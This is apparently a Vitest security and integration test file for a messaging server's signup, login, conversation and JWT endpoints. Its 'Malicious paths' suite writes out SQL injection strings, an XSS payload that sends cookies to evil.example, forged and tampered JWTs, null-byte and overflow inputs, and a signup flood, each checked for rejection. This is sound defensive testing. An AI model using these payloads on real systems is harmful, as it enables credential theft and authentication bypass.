import https from 'node:https'
import { describe, it, expect, beforeAll } from 'vitest'

const PROTOCOL = process.env.KD_PROTOCOL ?? 'https'
const HOST = process.env.KD_HOST ?? 'localhost'
const PORT = process.env.KD_PORT ?? '8080'
const BASE_URL = `${PROTOCOL}://${HOST}:${PORT}`

const agent = new https.Agent({ rejectUnauthorized: false })

interface ApiResponse {
  status: number
  data: Record<string, unknown>
}

async function api(
  method: string,
  path: string,
  body?: unknown,
  token?: string,
): Promise<ApiResponse> {
  return new Promise((resolve, reject) => {
    const url = new URL(`${BASE_URL}${path}`)
    const bodyStr = body !== undefined ? JSON.stringify(body) : undefined
    const headers: Record<string, string> = { 'Content-Type': 'application/json' }
    if (token) headers['Authorization'] = `Bearer ${token}`
    if (bodyStr) headers['Content-Length'] = String(Buffer.byteLength(bodyStr))

    const options: https.RequestOptions = {
      hostname: url.hostname,
      port: Number(url.port),
      path: url.pathname + url.search,
      method,
      headers,
      agent,
    }

    const req = https.request(options, (res) => {
      let raw = ''
      res.on('data', (chunk: Buffer) => {
        raw += chunk.toString()
      })
      res.on('end', () => {
        try {
          resolve({ status: res.statusCode!, data: JSON.parse(raw) })
        } catch {
          resolve({ status: res.statusCode!, data: { raw } })
        }
      })
    })
    req.on('error', reject)
    if (bodyStr) req.write(bodyStr)
    req.end()
  })
}

// Shared state populated by happy-path tests and consumed by later suites
const state: {
  aliceId: number
  aliceToken: string
  bobId: number
  bobToken: string
  convId: number
  msgId: number
} = {} as never

const run = Date.now()

// ---------------------------------------------------------------------------
// Happy paths — basic user flows with valid data
// ---------------------------------------------------------------------------

describe('Happy paths', () => {
  it('GET /health returns ok', async () => {
    const res = await api('GET', '/health')
    expect(res.status).toBe(200)
    expect(res.data).toMatchObject({ status: 'ok' })
  })

  it('GET / returns API info', async () => {
    const res = await api('GET', '/')
    expect(res.status).toBe(200)
    expect(res.data).toMatchObject({ name: 'Kingdom Server' })
  })

  it('POST /signup registers Alice', async () => {
    const res = await api('POST', '/signup', {
      username: `alice_${run}`,
      password: 'AlicePass123!',
      publicKey: 'alice-public-key-base64',
    })
    expect(res.status).toBe(201)
    expect(res.data).toHaveProperty('id')
    expect(res.data).toHaveProperty('token')
    state.aliceId = res.data['id'] as number
    state.aliceToken = res.data['token'] as string
  })

  it('POST /signup registers Bob', async () => {
    const res = await api('POST', '/signup', {
      username: `bob_${run}`,
      password: 'BobPass456!',
      publicKey: 'bob-public-key-base64',
    })
    expect(res.status).toBe(201)
    state.bobId = res.data['id'] as number
    state.bobToken = res.data['token'] as string
  })

  it('POST /login authenticates Alice', async () => {
    const res = await api('POST', '/login', {
      username: `alice_${run}`,
      password: 'AlicePass123!',
    })
    expect(res.status).toBe(200)
    expect(res.data).toHaveProperty('token')
    state.aliceToken = res.data['token'] as string
  })

  it("GET /users/:id/public-key returns Alice's public key", async () => {
    const res = await api('GET', `/users/${state.aliceId}/public-key`)
    expect(res.status).toBe(200)
    expect(res.data).toMatchObject({
      userId: state.aliceId,
      publicKey: 'alice-public-key-base64',
    })
  })

  it('POST /conversations creates a conversation between Alice and Bob', async () => {
    const res = await api(
      'POST',
      '/conversations',
      { name: 'alice-bob-chat', participantIds: [state.aliceId, state.bobId] },
      state.aliceToken,
    )
    expect(res.status).toBe(201)
    expect(res.data).toHaveProperty('id')
    state.convId = res.data['id'] as number
  })

  it("GET /users/:id/conversations lists Alice's conversations", async () => {
    const res = await api('GET', `/users/${state.aliceId}/conversations`, undefined, state.aliceToken)
    expect(res.status).toBe(200)
    expect(Array.isArray(res.data)).toBe(true)
    expect((res.data as unknown[]).some((c: unknown) => (c as { id: number }).id === state.convId)).toBe(true)
  })

  it('POST /conversations/:id/messages sends a message from Alice', async () => {
    const res = await api(
      'POST',
      `/conversations/${state.convId}/messages`,
      { senderId: state.aliceId, payload: 'Hello Bob, this is encrypted.' },
      state.aliceToken,
    )
    expect(res.status).toBe(201)
    expect(res.data).toHaveProperty('id')
    state.msgId = res.data['id'] as number
  })

  it('GET /conversations/:id/messages lists messages for a participant', async () => {
    const res = await api(
      'GET',
      `/conversations/${state.convId}/messages`,
      undefined,
      state.aliceToken,
    )
    expect(res.status).toBe(200)
    expect(Array.isArray(res.data)).toBe(true)
    expect((res.data as unknown[]).length).toBeGreaterThan(0)
  })

  it('Bob can also read messages in the shared conversation', async () => {
    const res = await api(
      'GET',
      `/conversations/${state.convId}/messages`,
      undefined,
      state.bobToken,
    )
    expect(res.status).toBe(200)
    expect(Array.isArray(res.data)).toBe(true)
  })

  it('DELETE /conversations/:id/messages/:msgId deletes a message', async () => {
    const sendRes = await api(
      'POST',
      `/conversations/${state.convId}/messages`,
      { senderId: state.aliceId, payload: 'To be deleted' },
      state.aliceToken,
    )
    const deleteId = sendRes.data['id'] as number
    const res = await api(
      'DELETE',
      `/conversations/${state.convId}/messages/${deleteId}`,
      undefined,
      state.aliceToken,
    )
    expect(res.status).toBe(200)
    expect(res.data).toMatchObject({ status: 'deleted', messageId: deleteId })
  })

  it("DELETE /conversations/:id/messages/:msgId/access/:userId revokes Bob's access", async () => {
    const res = await api(
      'DELETE',
      `/conversations/${state.convId}/messages/${state.msgId}/access/${state.bobId}`,
      undefined,
      state.aliceToken,
    )
    expect(res.status).toBe(200)
    expect(res.data).toMatchObject({ status: 'revoked' })
  })

  it('POST /logout revokes the session', async () => {
    const res = await api('POST', '/logout', undefined, state.aliceToken)
    expect(res.status).toBe(200)
    expect(res.data).toMatchObject({ status: 'success' })
    // Verify the revoked token is rejected
    const check = await api('GET', `/users/${state.aliceId}/conversations`, undefined, state.aliceToken)
    expect(check.status).toBe(401)
  })
})

// ---------------------------------------------------------------------------
// Unhappy paths — invalid inputs and auth violations
// ---------------------------------------------------------------------------

describe('Unhappy paths', () => {
  it('POST /signup rejects missing username', async () => {
    const res = await api('POST', '/signup', { password: 'pass', publicKey: 'key' })
    expect(res.status).toBe(400)
  })

  it('POST /signup rejects missing password', async () => {
    const res = await api('POST', '/signup', { username: 'x', publicKey: 'key' })
    expect(res.status).toBe(400)
  })

  it('POST /signup rejects missing publicKey', async () => {
    const res = await api('POST', '/signup', { username: 'x', password: 'pass' })
    expect(res.status).toBe(400)
  })

  it('POST /signup rejects empty username', async () => {
    const res = await api('POST', '/signup', { username: '', password: 'pass', publicKey: 'key' })
    expect(res.status).toBe(400)
  })

  it('POST /signup rejects username longer than 64 characters', async () => {
    const res = await api('POST', '/signup', {
      username: 'a'.repeat(65),
      password: 'pass',
      publicKey: 'key',
    })
    expect(res.status).toBe(400)
  })

  it('POST /signup rejects password longer than 72 characters', async () => {
    const res = await api('POST', '/signup', {
      username: `longpw_${run}`,
      password: 'p'.repeat(73),
      publicKey: 'key',
    })
    expect(res.status).toBe(400)
  })

  it('POST /signup rejects password shorter than 12 characters', async () => {
    const res = await api('POST', '/signup', {
      username: `shortpw_${run}`,
      password: 'Short123',
      publicKey: 'key',
    })
    expect(res.status).toBe(400)
  })

  it('POST /signup rejects password without an uppercase letter', async () => {
    const res = await api('POST', '/signup', {
      username: `noupper_${run}`,
      password: 'lowercase123',
      publicKey: 'key',
    })
    expect(res.status).toBe(400)
  })

  it('POST /signup rejects password without a number', async () => {
    const res = await api('POST', '/signup', {
      username: `nonumber_${run}`,
      password: 'NoNumberHere',
      publicKey: 'key',
    })
    expect(res.status).toBe(400)
  })

  it('POST /signup rejects duplicate username', async () => {
    const creds = { username: `dupe_${run}`, password: 'ValidPass123', publicKey: 'k' }
    await api('POST', '/signup', creds)
    const res = await api('POST', '/signup', creds)
    expect(res.status).toBe(409)
  })

  it('POST /login rejects wrong password', async () => {
    const res = await api('POST', '/login', {
      username: `alice_${run}`,
      password: 'WrongPassword!',
    })
    expect(res.status).toBe(401)
  })

  it('POST /login rejects non-existent user', async () => {
    const res = await api('POST', '/login', { username: 'nobody_ever_exists', password: 'pass' })
    expect(res.status).toBe(401)
  })

  it('GET /users/:id/public-key returns 404 for unknown user', async () => {
    const res = await api('GET', '/users/999999999/public-key')
    expect(res.status).toBe(404)
  })

  it('GET /users/:id/conversations returns 401 without auth', async () => {
    const res = await api('GET', `/users/${state.aliceId}/conversations`)
    expect(res.status).toBe(401)
  })

  it("GET /users/:id/conversations returns 403 when token belongs to a different user", async () => {
    // Bob's token cannot access Alice's conversation list
    const res = await api('GET', `/users/${state.aliceId}/conversations`, undefined, state.bobToken)
    expect(res.status).toBe(403)
  })

  it('POST /conversations returns 401 without auth', async () => {
    const res = await api('POST', '/conversations', {
      name: 'test',
      participantIds: [state.aliceId],
    })
    expect(res.status).toBe(401)
  })

  it('POST /conversations rejects empty name', async () => {
    const login = await api('POST', '/login', { username: `bob_${run}`, password: 'BobPass456!' })
    const tok = login.data['token'] as string
    const res = await api('POST', '/conversations', { name: '', participantIds: [state.bobId] }, tok)
    expect(res.status).toBe(400)
  })

  it('POST /conversations rejects duplicate participantIds', async () => {
    const login = await api('POST', '/login', { username: `bob_${run}`, password: 'BobPass456!' })
    const tok = login.data['token'] as string
    const res = await api(
      'POST',
      '/conversations',
      { name: 'dup-test', participantIds: [state.bobId, state.bobId] },
      tok,
    )
    expect(res.status).toBe(400)
  })

  it('POST /conversations/:id/messages returns 401 without auth', async () => {
    const res = await api('POST', `/conversations/${state.convId}/messages`, {
      senderId: state.aliceId,
      payload: 'hello',
    })
    expect(res.status).toBe(401)
  })

  it('POST /conversations/:id/messages rejects empty payload', async () => {
    const login = await api('POST', '/login', { username: `bob_${run}`, password: 'BobPass456!' })
    const tok = login.data['token'] as string
    const res = await api(
      'POST',
      `/conversations/${state.convId}/messages`,
      { senderId: state.bobId, payload: '' },
      tok,
    )
    expect(res.status).toBe(400)
  })

  it('POST /conversations/:id/messages rejects payload over 65536 characters', async () => {
    const login = await api('POST', '/login', { username: `bob_${run}`, password: 'BobPass456!' })
    const tok = login.data['token'] as string
    const res = await api(
      'POST',
      `/conversations/${state.convId}/messages`,
      { senderId: state.bobId, payload: 'x'.repeat(65537) },
      tok,
    )
    expect(res.status).toBe(400)
  })

  it('POST /conversations/:id/messages rejects senderId mismatch (impersonation attempt)', async () => {
    const login = await api('POST', '/login', { username: `bob_${run}`, password: 'BobPass456!' })
    const tok = login.data['token'] as string
    // Bob's token trying to send as Alice
    const res = await api(
      'POST',
      `/conversations/${state.convId}/messages`,
      { senderId: state.aliceId, payload: 'impersonated' },
      tok,
    )
    expect(res.status).toBe(403)
  })

  it('DELETE /conversations/:id/messages/:msgId returns 404 for non-existent message', async () => {
    const login = await api('POST', '/login', { username: `bob_${run}`, password: 'BobPass456!' })
    const tok = login.data['token'] as string
    const res = await api(
      'DELETE',
      `/conversations/${state.convId}/messages/999999999`,
      undefined,
      tok,
    )
    expect(res.status).toBe(404)
  })

  it('Revoked token is rejected on subsequent authenticated requests', async () => {
    // Alice's token from happy path was revoked via /logout
    const res = await api('GET', `/users/${state.aliceId}/conversations`, undefined, state.aliceToken)
    expect(res.status).toBe(401)
  })
})

// ---------------------------------------------------------------------------
// Malicious paths — security attack vectors
// ---------------------------------------------------------------------------

describe('Malicious paths', () => {
  let freshAliceToken: string

  beforeAll(async () => {
    const login = await api('POST', '/login', {
      username: `alice_${run}`,
      password: 'AlicePass123!',
    })
    freshAliceToken = login.data['token'] as string
  })

  it('SQL injection in signup username is handled safely', async () => {
    // ATTACK: Classic UNION-based injection attempting to dump users table.
    // Parameterised queries in Database.cc must neutralise this.
    const res = await api('POST', '/signup', {
      username: `' UNION SELECT id, username, password_hash FROM users; --`,
      password: 'ValidPass123',
      publicKey: 'key',
    })
    expect(res.status).not.toBe(500)
    expect([201, 400, 409]).toContain(res.status)
    // Response must not contain internal column names
    expect(JSON.stringify(res.data)).not.toMatch(/password_hash/i)
  })

  it('SQL injection in login password does not bypass authentication', async () => {
    // ATTACK: Classic OR-based injection attempting to always evaluate true.
    const res = await api('POST', '/login', {
      username: `alice_${run}`,
      password: `' OR '1'='1`,
    })
    expect(res.status).toBe(401)
  })

  it('SQL injection in login username does not leak user data', async () => {
    // ATTACK: Attempts to enumerate the users table via UNION injection in username.
    const res = await api('POST', '/login', {
      username: `' UNION SELECT id, username, password_hash FROM users LIMIT 1; --`,
      password: 'pass',
    })
    expect(res.status).toBe(401)
    expect(JSON.stringify(res.data)).not.toMatch(/password_hash/i)
  })

  it('XSS payload in message payload is stored as a literal string', async () => {
    // ATTACK: Stored XSS — a script tag in the message payload.
    // Since this is a JSON API the server must never execute content; the test
    // verifies the payload survives a round-trip unchanged and is JSON-encoded.
    const xss = '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>'
    const res = await api(
      'POST',
      `/conversations/${state.convId}/messages`,
      { senderId: state.aliceId, payload: xss },
      freshAliceToken,
    )
    expect(res.status).toBe(201)
    // The payload must come back as the exact literal string — no stripping or escaping
    expect((res.data as { payload: string })['payload']).toBe(xss)
  })

  it('Tampered JWT payload is rejected by signature verification', async () => {
    // ATTACK: Decode the JWT, escalate the subject to an admin-level ID,
    // then re-attach the original signature. The HMAC check must fail.
    const parts = freshAliceToken.split('.')
    const maliciousPayload = Buffer.from(
      JSON.stringify({ sub: '999999999', username: 'admin', iat: 0, exp: 9_999_999_999 }),
    ).toString('base64url')
    const tamperedToken = `${parts[0]}.${maliciousPayload}.${parts[2]}`
    const res = await api(
      'GET',
      `/users/${state.aliceId}/conversations`,
      undefined,
      tamperedToken,
    )
    expect(res.status).toBe(401)
  })

  it('Malformed JWT is rejected', async () => {
    // ATTACK: Send a syntactically broken token (missing signature segment).
    const res = await api('GET', `/users/${state.aliceId}/conversations`, undefined, 'not.a')
    expect(res.status).toBe(401)
  })

  it('Expired-looking JWT with future exp forged without valid signature is rejected', async () => {
    // ATTACK: Craft a JWT where exp is very far in the future, resign with a different key.
    const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url')
    const payload = Buffer.from(
      JSON.stringify({ sub: String(state.aliceId), exp: 9_999_999_999 }),
    ).toString('base64url')
    const fakeToken = `${header}.${payload}.invalidsignature`
    const res = await api('GET', `/users/${state.aliceId}/conversations`, undefined, fakeToken)
    expect(res.status).toBe(401)
  })

  it('Integer overflow value in userId path param is handled safely', async () => {
    // ATTACK: An astronomically large ID to trigger integer overflow in stoull / DB.
    const res = await api('GET', '/users/99999999999999999999999/public-key')
    expect(res.status).not.toBe(500)
  })

  it('Null byte in username is handled safely', async () => {
    // ATTACK: Embed a null byte to truncate string parsing in C standard library functions.
    const res = await api('POST', '/signup', {
      username: `safe\x00evil_${run}`,
      password: 'ValidPass123',
      publicKey: 'key',
    })
    expect(res.status).not.toBe(500)
  })

  it('Standalone one-time prekey consume endpoint is not exposed', async () => {
    const res = await api(
      'POST',
      `/users/${state.bobId}/one-time-prekeys/1/consume`,
      undefined,
      freshAliceToken,
    )
    expect(res.status).toBe(404)
  })

  it('Non-participant cannot read messages in a conversation', async () => {
    // ATTACK: Horizontal privilege escalation — Eve has a valid token but is not in the
    // alice-bob conversation, so she must receive 403.
    const eveRes = await api('POST', '/signup', {
      username: `eve_${run}`,
      password: 'EvePass789!',
      publicKey: 'eve-public-key',
    })
    const eveToken = eveRes.data['token'] as string
    const res = await api('GET', `/conversations/${state.convId}/messages`, undefined, eveToken)
    expect(res.status).toBe(403)
  })

  it('Non-participant cannot send messages in a conversation', async () => {
    // ATTACK: Horizontal privilege escalation — Eve tries to inject a message into a
    // conversation she is not part of.
    const eveLogin = await api('POST', '/login', {
      username: `eve_${run}`,
      password: 'EvePass789!',
    })
    const eveId = eveLogin.data['id'] as number
    const eveToken = eveLogin.data['token'] as string
    const res = await api(
      'POST',
      `/conversations/${state.convId}/messages`,
      { senderId: eveId, payload: 'Eve was here' },
      eveToken,
    )
    expect(res.status).toBe(403)
  })

  it('Excessive signup attempts trigger rate limiting (brute-force protection)', async () => {
    // ATTACK: Rapid-fire signups from the same IP to enumerate or flood.
    // The server applies a sliding-window rate limit per IP. In the test
    // environment KD_RATE_LIMIT_MAX_REQUESTS=50; fire 55 to guarantee throttling.
    const results: number[] = []
    for (let i = 0; i < 55; i++) {
      const res = await api('POST', '/signup', {
        username: `ratelimit_${run}_${i}`,
        password: 'ValidPass123',
        publicKey: 'key',
      })
      results.push(res.status)
    }
    // At least one of the 55 requests must have been throttled
    expect(results).toContain(429)
  })
})
